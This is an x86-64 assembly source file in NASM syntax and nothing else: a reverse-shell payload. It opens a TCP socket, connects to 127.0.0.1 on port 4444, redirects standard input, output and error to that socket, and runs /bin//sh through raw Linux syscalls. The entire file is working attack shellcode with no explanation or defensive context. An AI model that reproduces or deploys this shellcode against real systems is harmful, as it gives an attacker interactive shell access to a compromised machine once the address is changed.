BITS 64

global .start


.start:
    call .socket
    call .struct
    call .conn
    call .dup2
    call .exec
      
.socket:
     mov rax, 41
     mov rdi, 2
     mov rsi, 1
     xor rdx, rdx
     syscall
     mov rdi, rax

.struct:
     xor rax, rax 
     push rax
     mov dword [rsp-4], 0x0100007f
     mov word [rsp-6], 0x5c11
     mov word [rsp-8], 0x2
     sub rsp, 8

.conn:
     mov rax, 42
     mov rsi, rsp
     mov rdx, 16
     syscall


.dup2:
    mov rax, 33
    mov rsi, 0
    syscall
    mov rax, 33
    mov rsi, 1
    syscall
    mov rax, 33
    mov rsi, 2
    syscall



.exec:
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    mov rdx, rsp
    push rdi
    mov rsi, rsp
    add rax, 59
    syscall
 

